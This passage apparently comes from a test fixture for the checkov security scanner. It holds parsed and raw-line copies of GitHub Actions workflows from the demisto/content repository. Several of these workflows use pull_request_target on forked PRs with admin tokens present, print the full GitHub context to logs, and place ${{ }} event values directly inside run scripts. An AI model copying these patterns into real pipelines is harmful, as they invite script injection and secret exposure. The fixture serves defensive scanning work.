                            "__startline__": 44,
                            "__endline__": 48,
                        },
                        {
                            "name": "Delete Stale Non Contributor Branches",
                            "env": {
                                "CONTENTBOT_GH_ADMIN_TOKEN": "${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}",
                                "__startline__": 50,
                                "__endline__": 51,
                            },
                            "run": 'echo "Deleting stale non contribution branches"\ncd Utils/github_workflow_scripts\npipenv sync\npipenv run ./delete_stale_non_contrib_branches.py\necho "Finished deleting stale branches"\n',
                            "__startline__": 48,
                            "__endline__": 57,
                        },
                    ],
                    "__startline__": 35,
                    "__endline__": 57,
                },
                "__startline__": 10,
                "__endline__": 57,
            },
            "__startline__": 1,
            "__endline__": 57,
        },
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/handle-new-external-pr.yml": {
            "name": "Handle New External PRs",
            "on": {
                "pull_request_target": {"types": ["opened"], "__startline__": 4, "__endline__": 6},
                "__startline__": 3,
                "__endline__": 6,
            },
            "permissions": {"contents": "read", "__startline__": 7, "__endline__": 9},
            "jobs": {
                "handle_new_external_pr": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.repository == 'demisto/content' && github.event.action == 'opened' && github.event.pull_request.head.repo.fork == true && contains(github.head_ref, 'xsoar-bot-contrib-ContributionTestPack') == false",
                    "steps": [
                        {"name": "Checkout", "uses": "actions/checkout@v3", "__startline__": 14, "__endline__": 16},
                        {
                            "name": "Setup Python",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.9", "__startline__": 19, "__endline__": 21},
                            "__startline__": 16,
                            "__endline__": 21,
                        },
                        {
                            "name": "Print Context",
                            "run": 'echo "$GITHUB_CONTEXT"\n',
                            "env": {"GITHUB_CONTEXT": "${{ toJson(github) }}", "__startline__": 25, "__endline__": 27},
                            "__startline__": 21,
                            "__endline__": 27,
                        },
                        {
                            "name": "Install Python Dependencies",
                            "run": "python -m pip install --upgrade pip\npip install pipenv==2021.5.29\n",
                            "__startline__": 27,
                            "__endline__": 31,
                        },
                        {
                            "name": "Update External PR",
                            "env": {
                                "CONTENTBOT_GH_ADMIN_TOKEN": "${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}",
                                "EVENT_PAYLOAD": "${{ toJson(github.event) }}",
                                "__startline__": 33,
                                "__endline__": 35,
                            },
                            "run": 'echo "Updating External PR ${{ github.event.pull_request.html_url }}"\ncd Utils/github_workflow_scripts\npipenv sync\npipenv run ./handle_external_pr.py\necho "Finished Handling External PR"\n',
                            "__startline__": 31,
                            "__endline__": 41,
                        },
                        {
                            "name": "Send Notification",
                            "env": {
                                "CONTENTBOT_GH_ADMIN_TOKEN": "${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}",
                                "EVENT_PAYLOAD": "${{ toJson(github.event) }}",
                                "CORTEX_XSOAR_SLACK_TOKEN": "${{ secrets.CORTEX_XSOAR_SLACK_TOKEN }}",
                                "__startline__": 43,
                                "__endline__": 46,
                            },
                            "run": 'echo "Sending notification about External PR ${{ github.event.pull_request.html_url }}"\ncd Utils/github_workflow_scripts\npipenv run ./send_slack_message.py\n',
                            "__startline__": 41,
                            "__endline__": 50,
                        },
                    ],
                    "__startline__": 11,
                    "__endline__": 50,
                },
                "__startline__": 10,
                "__endline__": 50,
            },
            "__startline__": 1,
            "__endline__": 50,
        },
    }
    defs_raw = {
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/run-secrets-detection.yml": [
            (1, "name: Secrets Detection\n"),
            (2, "on: pull_request\n"),
            (3, "\n"),
            (4, "jobs:\n"),
            (5, "  secrets_detection:\n"),
            (6, "    runs-on: ubuntu-latest\n"),
            (
                7,
                "    if: github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == false && github.actor != 'dependabot[bot]'\n",
            ),
            (8, "    steps:\n"),
            (9, "      - name: Checkout\n"),
            (10, "        uses: actions/checkout@v3\n"),
            (11, "      - name: Setup Python\n"),
            (12, "        uses: actions/setup-python@v3\n"),
            (13, "        with:\n"),
            (14, "          python-version: '3.8'\n"),
            (15, "      - name: Setup Poetry\n"),
            (16, "        uses: Gr1N/setup-poetry@v7\n"),
            (17, "      - name: Install Python Dependencies\n"),
            (18, "        run: |\n"),
            (19, "          poetry install --with ci\n"),
            (20, "      - name: Run Secrets Detection\n"),
            (21, "        env:\n"),
            (22, "          PR_NUMBER: ${{ github.event.pull_request.number }}\n"),
            (23, "          BRANCH_NAME: ${{ github.head_ref }}\n"),
            (24, "          USERNAME: ${{ secrets.SECRET_CHECK_USER }}\n"),
            (25, "          PASSWORD: ${{ secrets.SECRET_CHECK_PASS }}\n"),
            (26, "        run: |\n"),
            (27, '          echo "Run secrets detection for PR: $PR_NUMBER on branch: $BRANCH_NAME"\n'),
            (
                28,
                "          investigation_id=$(poetry run Utils/github_workflow_scripts/run_secrets_detection.py --pr_number $PR_NUMBER --branch_name $BRANCH_NAME --username $USERNAME --password $PASSWORD)\n",
            ),
            (29, '          echo "INVESTIGATION_ID=$investigation_id" >> $GITHUB_ENV\n'),
            (30, "      - name: Wait For Playbook To Finish\n"),
            (31, "        env:\n"),
            (32, "          GOLD_API_KEY: ${{ secrets.SECRETS_GOLD_API_KEY }}\n"),
            (33, "        run: |\n"),
            (34, '          echo "Invastigation id is: $INVESTIGATION_ID "\n'),
            (
                35,
                "          poetry run python ./Utils/github_workflow_scripts/run_secrets_detection_get_playbook_status.py -i $INVESTIGATION_ID -k $GOLD_API_KEY\n",
            ),
            (36, "\n"),
            (37, "\n"),
        ],
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/trigger-contribution-build.yml": [
            (1, "name: Trigger Contribution Build\n"),
            (2, "on:\n"),
            (3, "  pull_request_target:\n"),
            (4, "    types: [labeled]\n"),
            (5, "\n"),
            (6, "jobs:\n"),
            (7, "  trigget_contrib_build:\n"),
            (8, "    runs-on: ubuntu-latest\n"),
            (
                9,
                "    if: github.event.action == 'labeled' && contains(github.event.pull_request.labels.*.name, 'ready-for-instance-test') == true && github.event.pull_request.head.repo.fork == true\n",
            ),
            (10, "    steps:\n"),
            (11, "      - name: Checkout\n"),
            (12, "        uses: actions/checkout@v3\n"),
            (13, "      - name: Setup Python\n"),
            (14, "        uses: actions/setup-python@v3\n"),
            (15, "        with:\n"),
            (16, "          python-version: '3.9'\n"),
            (17, "      - name: Setup Poetry\n"),
            (18, "        uses: Gr1N/setup-poetry@v7\n"),
            (19, "      - name: Install Python Dependencies\n"),
            (20, "        run: |\n"),
            (21, "          poetry install --with ci\n"),
            (22, "      - name: Trigger Contribution Build\n"),
            (23, "        env:\n"),
            (24, "          PR_NUMBER: ${{ github.event.pull_request.number }}\n"),
            (25, "          BASE_BRANCH: ${{ github.event.pull_request.base.ref }}\n"),
            (26, "          CONTRIB_BRANCH: ${{ github.event.pull_request.head.label }}\n"),
            (27, "          USERNAME: ${{ secrets.TRIGGER_BUILD_USER }}\n"),
            (28, "          PASSWORD: ${{ secrets.TRIGGER_BUILD_PASSWORD }}\n"),
            (29, "        run: |\n"),
            (
                30,
                '          echo "Trigger contribution build for PR: $PR_NUMBER with base branch: $BASE_BRANCH contrib branch: $CONTRIB_BRANCH"\n',
            ),
            (
                31,
                "          poetry run python ./Utils/github_workflow_scripts/trigger_contribution_build.py --pr_number $PR_NUMBER --base_branch $BASE_BRANCH --contrib_branch $CONTRIB_BRANCH --username $USERNAME --password $PASSWORD\n",
            ),
        ],
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/review-release-notes.yml": [
            (1, "name: Review Release Notes\n"),
            (2, "on: pull_request\n"),
            (3, "\n"),
            (4, "jobs:\n"),
            (5, "  release_notes_review:\n"),
            (6, "    runs-on: ubuntu-latest\n"),
            (
                7,
                "    if: github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == false\n",
            ),
            (8, "    steps:\n"),
            (9, "      - name: Checkout\n"),
            (10, "        uses: actions/checkout@v3\n"),
            (11, "        with:\n"),
            (12, "          fetch-depth: 2\n"),
            (13, "      - name: Get changed files\n"),
            (14, "        id: changed-files\n"),
            (15, "        uses: tj-actions/changed-files@v18.7\n"),
            (16, "        with:\n"),
            (17, "          separator: ';'\n"),
            (18, "      - name: Setup Python\n"),
            (19, "        uses: actions/setup-python@v3\n"),
            (20, "        with:\n"),
            (21, "          python-version: '3.9'\n"),
            (22, "      - name: Setup Poetry\n"),
            (23, "        uses: Gr1N/setup-poetry@v7\n"),
            (24, "      - name: Install Python Dependencies\n"),
            (25, "        run: |\n"),
            (26, "          poetry install --with ci\n"),
            (27, "      - name: Review Release Notes\n"),
            (28, "        run: |\n"),
            (29, '          changed_files="${{ steps.changed-files.outputs.all_changed_files }}"\n'),
            (30, "          delim=';'\n"),
            (31, '          echo "Starting docs review"\n'),
            (
                32,
                '          poetry run python Utils/github_workflow_scripts/run_docs_review.py --changed_files "$changed_files" --delimiter $delim\n',
            ),
            (33, '          echo "Finished docs review successfully"'),
        ],
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/sync-contribution-base-branch.yml": [
            (1, "name: Sync contributor base branch\n"),
            (2, "on:\n"),
            (3, "  schedule:\n"),
            (4, "    # runs at minute 0 of the 0th hour every day.\n"),
            (5, "    - cron:  '0 0 * * *'\n"),
            (6, "\n"),
            (7, "permissions:\n"),
            (8, "  contents: read\n"),
            (9, "\n"),
            (10, "jobs:\n"),
            (11, "  sync_contributor_base_branch:\n"),
            (12, "    runs-on: ubuntu-latest\n"),
            (13, "    if: github.repository == 'demisto/content'\n"),
            (14, "    steps:\n"),
            (15, "      - name: Checkout\n"),
            (16, "        uses: actions/checkout@v3\n"),
            (17, "      - name: Setup Python\n"),
            (18, "        uses: actions/setup-python@v3\n"),
            (19, "        with:\n"),
            (20, "          python-version: '3.9'\n"),
            (21, "      - name: Install Python Dependencies\n"),
            (22, "        run: |\n"),
            (23, "          python -m pip install --upgrade pip\n"),
            (24, "          pip install pipenv==2021.5.29\n"),
            (25, "      - name: Sync Base Branch to Master\n"),
            (26, "        env:\n"),
            (27, "          CONTENTBOT_GH_ADMIN_TOKEN: ${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}\n"),
            (28, "        run: |\n"),
            (29, '          echo "Updating contribution base branches (contrib/*)"\n'),
            (30, "          cd Utils/github_workflow_scripts\n"),
            (31, "          pipenv sync\n"),
            (32, "          pipenv run ./sync_contrib_base.py\n"),
            (33, '          echo "Finished updating base branches"\n'),
        ],
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/check-contribution-form-filled.yml": [
            (1, "name: Contribution Form Filled label verification\n"),
            (2, "on:\n"),
            (3, "  pull_request:\n"),
            (4, "    types: [opened, synchronize, labeled, unlabeled]\n"),
            (5, "\n"),
            (6, "permissions:\n"),
            (7, "  pull-requests: read\n"),
            (8, "\n"),
            (9, "jobs:\n"),
            (10, "  contribution_form_filled_verification:\n"),
            (11, "    runs-on: ubuntu-latest\n"),
            (
                12,
                "    # This status check only runs for: forked PRS that don't contain the '[Marketplace Contribution]' in their title and the head branch is not a test branch.\n",
            ),
            (
                13,
                "    if: github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == true && contains(github.head_ref, 'xsoar-bot-contrib-ContributionTestPack') == false && contains(github.event.pull_request.title, '[Marketplace Contribution]') == false\n",
            ),
            (14, "    steps:\n"),
            (15, "      - name: Checkout\n"),
            (16, "        uses: actions/checkout@v3\n"),
            (17, "      - name: Setup Python\n"),
            (18, "        uses: actions/setup-python@v3\n"),
            (19, "        with:\n"),
            (20, "          python-version: '3.9'\n"),
            (21, "      - name: Install Python Dependencies\n"),
            (22, "        run: |\n"),
            (23, "          python -m pip install --upgrade pip\n"),
            (24, "          pip install pipenv==2021.5.29\n"),
            (25, "          cd Utils/github_workflow_scripts\n"),
            (26, "          pipenv sync\n"),
            (27, "      - name: Check if contribution form needs to be filled\n"),
            (28, "        env:\n"),
            (29, "          PR_NUMBER: ${{ github.event.pull_request.number }}\n"),
            (30, "          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"),
            (31, "        run: |\n"),
            (32, '          echo "Checking if contribution form needs to be filled for PR: $PR_NUMBER"\n'),
            (33, "          cd Utils/github_workflow_scripts\n"),
            (
                34,
                "          pipenv run ./check_if_needs_to_fill_contribution_form.py --pr_number $PR_NUMBER --github_token $GITHUB_TOKEN\n",
            ),
        ],
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/close_jira_issue_by_pr_merge.yml": [
            (1, "name: Add PR link to Related Jira Issue\n"),
            (2, "on:\n"),
            (3, "  pull_request:\n"),
            (4, "    types: [ closed ]\n"),
            (5, "\n"),
            (6, "permissions:\n"),
            (7, "  pull-requests: read\n"),
            (8, "\n"),
            (9, "jobs:\n"),
            (10, "  add_pr_link_to_related_jira_issue:\n"),
            (11, "    runs-on: ubuntu-latest\n"),
            (
                12,
                "    if: github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == false && github.actor != 'dependabot[bot]' && github.event.action == 'closed' && github.event.pull_request.merged == true \n",
            ),
            (13, "    steps:\n"),
            (14, "      - name: Checkout\n"),
            (15, "        uses: actions/checkout@v3\n"),
            (16, "      - name: Setup Python\n"),
            (17, "        uses: actions/setup-python@v3\n"),
            (18, "        with:\n"),
            (19, "          python-version: '3.9'\n"),
            (20, "      - name: Setup Poetry\n"),
            (21, "        uses: Gr1N/setup-poetry@v7\n"),
            (22, "      - uses: actions/cache@v2\n"),
            (23, "        with:\n"),
            (24, "          path: .venv\n"),
            (25, "          key: ${{ runner.os }}-poetry-${{ hashFiles('poetry.lock') }}\n"),
            (26, "      - name: Install Python Dependencies\n"),
            (27, "        run: |\n"),
            (28, "          poetry install --with ci\n"),
            (29, "      - name: Run Linking pr to Jira Script\n"),
            (30, "        env:\n"),
            (31, "          PR_NUMBER: ${{ github.event.pull_request.number }}\n"),
            (32, "          PR_TITLE: ${{ github.event.pull_request.title }}\n"),
            (33, "          PR_LINK: ${{ github.event.pull_request.html_url }}\n"),
            (34, "          PR_BODY: ${{ github.event.pull_request.body }}\n"),
            (35, "          IS_MERGED: True\n"),
            (36, "          USERNAME: ${{ secrets.LINK_PR_TO_JIRA_ISSUE_USER }}\n"),
            (37, "          PASSWORD: ${{ secrets.LINK_PR_TO_JIRA_ISSUE_PASSWORD }}\n"),
            (38, "          INSTANCE_URL: ${{ secrets.ENGINE_URL }}\n"),
            (39, "        run: |\n"),
            (40, '          echo "Checking for related Jira issues to PR: $PR_NUMBER"\n'),
            (41, "          cd Utils/github_workflow_scripts/jira_integration_scripts\n"),
            (
                42,
                '          poetry run python ./link_pr_to_jira_issue.py --url "$INSTANCE_URL" --pr_num "$PR_NUMBER" --pr_link "$PR_LINK" --pr_title "$PR_TITLE" --pr_body "$PR_BODY" --is_merged $IS_MERGED --username $USERNAME --password $PASSWORD\n',
            ),
        ],
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/project_manager_hourly.yml": [
            (1, "name: Manage Contribution Board - Hourly\n"),
            (2, "on:\n"),
            (3, "  schedule:\n"),
            (4, "    - cron:  '0 * * * *'\n"),
            (5, "permissions:\n"),
            (6, "  contents: read\n"),
            (7, "\n"),
            (8, "jobs:\n"),
            (9, "  manage_project_board:\n"),
            (10, "    runs-on: ubuntu-latest\n"),
            (11, "    if: github.repository == 'demisto/content'\n"),
            (12, "    steps:\n"),
            (13, "      - uses: actions/checkout@v3\n"),
            (14, "      - name: Set up Python 3.7\n"),
            (15, "        uses: actions/setup-python@v3\n"),
            (16, "        with:\n"),
            (17, "          python-version: '3.7'\n"),
            (18, "      - name: Get project manager\n"),
            (19, "        run: |\n"),
            (20, "          pip install --upgrade pip\n"),
            (21, "          pip install github-automation\n"),
            (22, "      - name: Manage project\n"),
            (23, "        run: |\n"),
            (24, "          github-automation manage -c .github/project_conf/contributions.ini\n"),
            (25, "        env:\n"),
            (26, "          GITHUB_TOKEN: ${{ secrets.CONTENTBOT_BOARD_UPDATE_TOKEN }}\n"),
        ],
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/create-internal-pr-from-external.yml": [
            (1, "name: Create Internal PR from Merged External PR\n"),
            (2, "on:\n"),
            (3, "  pull_request_target:\n"),
            (4, "    types: [closed]\n"),
            (5, "    branches:\n"),
            (6, "      - contrib/**\n"),
            (7, "\n"),
            (8, "jobs:\n"),
            (9, "  create_internal_pr:\n"),
            (10, "    runs-on: ubuntu-latest\n"),
            (
                11,
                "    if: github.repository == 'demisto/content' && github.event.action == 'closed' && github.event.pull_request.merged == true && github.event.pull_request.head.repo.fork == true\n",
            ),
            (12, "    steps:\n"),
            (13, "      - name: Checkout\n"),
            (14, "        uses: actions/checkout@v3\n"),
            (15, "      - name: Setup Python\n"),
            (16, "        uses: actions/setup-python@v3\n"),
            (17, "        with:\n"),
            (18, "          python-version: '3.9'\n"),
            (19, "\n"),
            (20, "      - name: Print Context\n"),
            (21, "        run: |\n"),
            (22, '          echo "$GITHUB_CONTEXT"\n'),
            (23, "        env:\n"),
            (24, "          GITHUB_CONTEXT: ${{ toJson(github) }}\n"),
            (25, "\n"),
            (26, "      - name: Install Python Dependencies\n"),
            (27, "        run: |\n"),
            (28, "          python -m pip install --upgrade pip\n"),
            (29, "          pip install pipenv==2021.5.29\n"),
            (30, "      - name: Create Internal PR\n"),
            (31, "        env:\n"),
            (32, "          CONTENTBOT_GH_ADMIN_TOKEN: ${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}\n"),
            (33, "          EVENT_PAYLOAD: ${{ toJson(github.event) }}\n"),
            (34, "        run: |\n"),
            (
                35,
                '          echo "Creating an internal PR from original merged external PR ${{ github.event.pull_request.html_url }}"\n',
            ),
            (36, "          cd Utils/github_workflow_scripts\n"),
            (37, "          pipenv sync\n"),
            (38, "          pipenv run ./create_internal_pr.py\n"),
            (39, '          echo "Finished Creating Internal PR"\n'),
        ],
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/sync-contribution-base-branch-on-change.yml": [
            (1, "name: Sync contributor base branch on change\n"),
            (2, "on:\n"),
            (3, "  pull_request_target:\n"),
            (4, "    types:\n"),
            (5, "      - edited\n"),
            (6, "      - synchronize\n"),
            (7, "    branches:\n"),
            (8, "      - 'contrib/**'\n"),
            (9, "\n"),
            (10, "permissions:\n"),
            (11, "  contents: read\n"),
            (12, "\n"),
            (13, "jobs:\n"),
            (14, "  sync_contributor_base_branch:\n"),
            (15, "    runs-on: ubuntu-latest\n"),
            (
                16,
                "    if: github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == true && contains(github.head_ref, 'xsoar-bot-contrib-ContributionTestPack') == false\n",
            ),
            (17, "    steps:\n"),
            (18, "      - name: Checkout\n"),
            (19, "        uses: actions/checkout@v3\n"),
            (20, "      - name: Setup Python\n"),
            (21, "        uses: actions/setup-python@v3\n"),
            (22, "        with:\n"),
            (23, "          python-version: '3.9'\n"),
            (24, "      - name: Install Python Dependencies\n"),
            (25, "        run: |\n"),
            (26, "          python -m pip install --upgrade pip\n"),
            (27, "          pip install pipenv==2021.5.29\n"),
            (28, "      - name: Sync Base Branch to Master\n"),
            (29, "        env:\n"),
            (30, "          CONTENTBOT_GH_ADMIN_TOKEN: ${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}\n"),
            (31, "        run: |\n"),
            (32, '          echo "Updating contribution base branch (contrib/*)"\n'),
            (33, "          cd Utils/github_workflow_scripts\n"),
            (34, "          pipenv sync\n"),
            (
                35,
                "          pipenv run ./sync_contrib_base.py --branch_name ${{ github.event.pull_request.base.ref }}\n",
            ),
            (36, '          echo "Finished updating base branch"\n'),
        ],
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/link_edited_pr_to_jira_issue.yml": [
            (1, "name: Add PR link to Related Jira Issue\n"),
            (2, "on:\n"),
            (3, "  pull_request:\n"),
            (4, "    types: [ opened, edited ]\n"),
            (5, "\n"),
            (6, "permissions:\n"),
            (7, "  pull-requests: read\n"),
            (8, "\n"),
            (9, "jobs:\n"),
            (10, "  add_pr_link_to_related_jira_issue:\n"),
            (11, "    runs-on: ubuntu-latest\n"),
            (
                12,
                "    if: github.repository == 'demisto/content' && github.event.pull_request.head.repo.fork == false && github.actor != 'dependabot[bot]'\n",
            ),
            (13, "    steps:\n"),
            (14, "      - name: Checkout\n"),
            (15, "        uses: actions/checkout@v3\n"),
            (16, "      - name: Setup Python\n"),
            (17, "        uses: actions/setup-python@v3\n"),
            (18, "        with:\n"),
            (19, "          python-version: '3.9'\n"),
            (20, "      - name: Setup Poetry\n"),
            (21, "        uses: Gr1N/setup-poetry@v7\n"),
            (22, "      - uses: actions/cache@v2\n"),
            (23, "        with:\n"),
            (24, "          path: .venv\n"),
            (25, "          key: ${{ runner.os }}-poetry-${{ hashFiles('poetry.lock') }}\n"),
            (26, "      - name: Install Python Dependencies\n"),
            (27, "        run: |\n"),
            (28, "          poetry install --with ci\n"),
            (29, "      - name: Run Linking pr to Jira Script\n"),
            (30, "        env:\n"),
            (31, "          PR_NUMBER: ${{ github.event.pull_request.number }}\n"),
            (32, "          PR_TITLE: ${{ github.event.pull_request.title }}\n"),
            (33, "          PR_LINK: ${{ github.event.pull_request.html_url }}\n"),
            (34, "          PR_BODY: ${{ github.event.pull_request.body }}\n"),
            (35, "          IS_MERGED: false\n"),
            (36, "          USERNAME: ${{ secrets.LINK_PR_TO_JIRA_ISSUE_USER }}\n"),
            (37, "          PASSWORD: ${{ secrets.LINK_PR_TO_JIRA_ISSUE_PASSWORD }}\n"),
            (38, "          INSTANCE_URL: ${{ secrets.ENGINE_URL }}\n"),
            (39, "        run: |\n"),
            (40, '          echo "Checking for related Jira issues to PR: $PR_NUMBER"\n'),
            (41, "          cd Utils/github_workflow_scripts/jira_integration_scripts\n"),
            (
                42,
                "          echo --pr_num $PR_NUMBER --pr_link $PR_LINK --pr_title $PR_TITLE --pr_body $PR_BODY --is_merged $IS_MERGED\n",
            ),
            (
                43,
                '          poetry run python ./link_pr_to_jira_issue.py --url "$INSTANCE_URL" --pr_num "$PR_NUMBER" --pr_link "$PR_LINK" --pr_title "$PR_TITLE" --pr_body "$PR_BODY" --is_merged $IS_MERGED --username $USERNAME --password $PASSWORD\n',
            ),
        ],
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/check-contributor-pack.yml": [
            (1, "name: Check contributor packs\n"),
            (2, "on:\n"),
            (3, "  pull_request:\n"),
            (4, "    branches:\n"),
            (5, "      - master\n"),
            (6, "\n"),
            (7, "permissions:\n"),
            (8, "  pull-requests: write\n"),
            (9, "\n"),
            (10, "jobs:\n"),
            (11, "  check_contributor_pack:\n"),
            (12, "    runs-on: ubuntu-latest\n"),
            (
                13,
                "    if: github.repository == 'demisto/content' && startsWith(github.head_ref, 'contrib/') == false && startsWith(github.head_ref, 'to-merge/') == false && contains(github.head_ref, 'xsoar-bot-contrib-ContributionTestPack') == false && github.event.pull_request.head.repo.fork == false\n",
            ),
            (14, "    steps:\n"),
            (15, "      - name: Checkout\n"),
            (16, "        uses: actions/checkout@v3\n"),
            (17, "      - name: Setup Python\n"),
            (18, "        uses: actions/setup-python@v3\n"),
            (19, "        with:\n"),
            (20, "          python-version: '3.8'\n"),
            (21, "      - name: Setup Poetry\n"),
            (22, "        uses: Gr1N/setup-poetry@v7\n"),
            (23, "      - name: Install python dependencies\n"),
            (24, "        run: |\n"),
            (25, "          poetry install --with ci\n"),
            (26, "      - name: Check pack and request review\n"),
            (27, "        env:\n"),
            (28, "          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"),
            (29, "          PR_NUMBER: ${{ github.event.pull_request.number }}\n"),
            (30, "          BRANCH_NAME: ${{ github.head_ref }}\n"),
            (31, "          SENDGRID_EMAIL_API_KEY: ${{ secrets.SENDGRID_EMAIL_API_KEY }}\n"),
            (32, "        if: env.SENDGRID_EMAIL_API_KEY\n"),
            (33, "        run: |\n"),
            (34, '          echo "PR number is: $PR_NUMBER"\n'),
            (35, '          echo "Target branch name is: $BRANCH_NAME"\n'),
            (36, '          echo "Starting check of contributor packs"\n'),
            (
                37,
                "          poetry run python ./Utils/request_contributor_review.py --pr_number $PR_NUMBER --github_token $GITHUB_TOKEN --email_api_token $SENDGRID_EMAIL_API_KEY\n",
            ),
            (38, '          echo "Finished check of contributor packs"\n'),
        ],
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/project_manager_daily.yml": [
            (1, "name: Manage Contribution Board - Daily\n"),
            (2, "on:\n"),
            (3, "  schedule:\n"),
            (4, "    - cron:  '0 0 * * *'\n"),
            (5, "permissions:\n"),
            (6, "  contents: read\n"),
            (7, "\n"),
            (8, "jobs:\n"),
            (9, "  manage_project_board:\n"),
            (10, "    runs-on: ubuntu-latest\n"),
            (11, "    if: github.repository == 'demisto/content'\n"),
            (12, "    steps:\n"),
            (13, "      - uses: actions/checkout@v3\n"),
            (14, "      - name: Set up Python 3.7\n"),
            (15, "        uses: actions/setup-python@v3\n"),
            (16, "        with:\n"),
            (17, "          python-version: '3.7'\n"),
            (18, "      - name: Get project manager\n"),
            (19, "        run: |\n"),
            (20, "          pip install --upgrade pip\n"),
            (21, "          pip install github-automation\n"),
            (22, "      - name: Manage project\n"),
            (23, "        run: |\n"),
            (24, "          github-automation manage -c .github/project_conf/contributions.ini\n"),
            (25, "        env:\n"),
            (26, "          GITHUB_TOKEN: ${{ secrets.CONTENTBOT_BOARD_UPDATE_TOKEN }}\n"),
        ],
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/handle-stale-branches.yml": [
            (1, "name: Handle stale branches\n"),
            (2, "on:\n"),
            (3, "  schedule:\n"),
            (4, "    # runs every day at midnight (UTC time).\n"),
            (5, "    - cron:  '0 0 * * *'\n"),
            (6, "permissions:\n"),
            (7, "  contents: read\n"),
            (8, "\n"),
            (9, "jobs:\n"),
            (10, "  handle_contributor_stale_branches:\n"),
            (11, "    runs-on: ubuntu-latest\n"),
            (12, "    if: github.repository == 'demisto/content'\n"),
            (13, "    steps:\n"),
            (14, "      - name: Checkout\n"),
            (15, "        uses: actions/checkout@v3\n"),
            (16, "      - name: Setup Python\n"),
            (17, "        uses: actions/setup-python@v3\n"),
            (18, "        with:\n"),
            (19, "          python-version: '3.9'\n"),
            (20, "      - name: Install Python Dependencies\n"),
            (21, "        run: |\n"),
            (22, "          python -m pip install --upgrade pip\n"),
            (23, "          pip install pipenv==2021.5.29\n"),
            (24, "      - name: Delete Stale Contributor Branches\n"),
            (25, "        env:\n"),
            (26, "          CONTENTBOT_GH_ADMIN_TOKEN: ${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}\n"),
            (27, "        run: |\n"),
            (28, '          echo "Deleting stale contribution base branches (contrib/*)"\n'),
            (29, "          cd Utils/github_workflow_scripts\n"),
            (30, "          pipenv sync\n"),
            (31, "          pipenv run ./delete_stale_contrib_branches.py\n"),
            (32, '          echo "Finished deleting stale branches"\n'),
            (33, "\n"),
            (34, "  handle_stale_non_contributor_branches:\n"),
            (35, "    runs-on: ubuntu-latest\n"),
            (36, "    if: github.repository == 'demisto/content'\n"),
            (37, "    steps:\n"),
            (38, "      - name: Checkout\n"),
            (39, "        uses: actions/checkout@v3\n"),
            (40, "      - name: Setup Python\n"),
            (41, "        uses: actions/setup-python@v3\n"),
            (42, "        with:\n"),
            (43, "          python-version: '3.9'\n"),
            (44, "      - name: Install Python Dependencies\n"),
            (45, "        run: |\n"),
            (46, "          python -m pip install --upgrade pip\n"),
            (47, "          pip install pipenv==2021.5.29\n"),
            (48, "      - name: Delete Stale Non Contributor Branches\n"),
            (49, "        env:\n"),
            (50, "          CONTENTBOT_GH_ADMIN_TOKEN: ${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}\n"),
            (51, "        run: |\n"),
            (52, '          echo "Deleting stale non contribution branches"\n'),
            (53, "          cd Utils/github_workflow_scripts\n"),
            (54, "          pipenv sync\n"),
            (55, "          pipenv run ./delete_stale_non_contrib_branches.py\n"),
            (56, '          echo "Finished deleting stale branches"\n'),
        ],
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/handle-new-external-pr.yml": [
            (1, "name: Handle New External PRs\n"),
            (2, "on:\n"),
            (3, "  pull_request_target:\n"),
            (4, "    types: [opened]\n"),
            (5, "\n"),
            (6, "permissions:\n"),
            (7, "  contents: read\n"),
            (8, "\n"),
            (9, "jobs:\n"),
            (10, "  handle_new_external_pr:\n"),
            (11, "    runs-on: ubuntu-latest\n"),
            (
                12,
                "    if: github.repository == 'demisto/content' && github.event.action == 'opened' && github.event.pull_request.head.repo.fork == true && contains(github.head_ref, 'xsoar-bot-contrib-ContributionTestPack') == false\n",
            ),
            (13, "    steps:\n"),
            (14, "      - name: Checkout\n"),
            (15, "        uses: actions/checkout@v3\n"),
            (16, "      - name: Setup Python\n"),
            (17, "        uses: actions/setup-python@v3\n"),
            (18, "        with:\n"),
            (19, "          python-version: '3.9'\n"),
            (20, "\n"),
            (21, "      - name: Print Context\n"),
            (22, "        run: |\n"),
            (23, '          echo "$GITHUB_CONTEXT"\n'),
            (24, "        env:\n"),
            (25, "          GITHUB_CONTEXT: ${{ toJson(github) }}\n"),
            (26, "\n"),
            (27, "      - name: Install Python Dependencies\n"),
            (28, "        run: |\n"),
            (29, "          python -m pip install --upgrade pip\n"),
            (30, "          pip install pipenv==2021.5.29\n"),
            (31, "      - name: Update External PR\n"),
            (32, "        env:\n"),
            (33, "          CONTENTBOT_GH_ADMIN_TOKEN: ${{ secrets.CONTENTBOT_GH_ADMIN_TOKEN }}\n"),
            (34, "          EVENT_PAYLOAD: ${{ toJson(github.event) }}\n"),
            (35, "        run: |\n"),
            (36, '          echo "Updating External PR ${{ github.event.pull_request.html_url }}"\n'),
            (37, "          cd Utils/github_workflow_scripts\n"),
            (38, "          pipenv sync\n"),
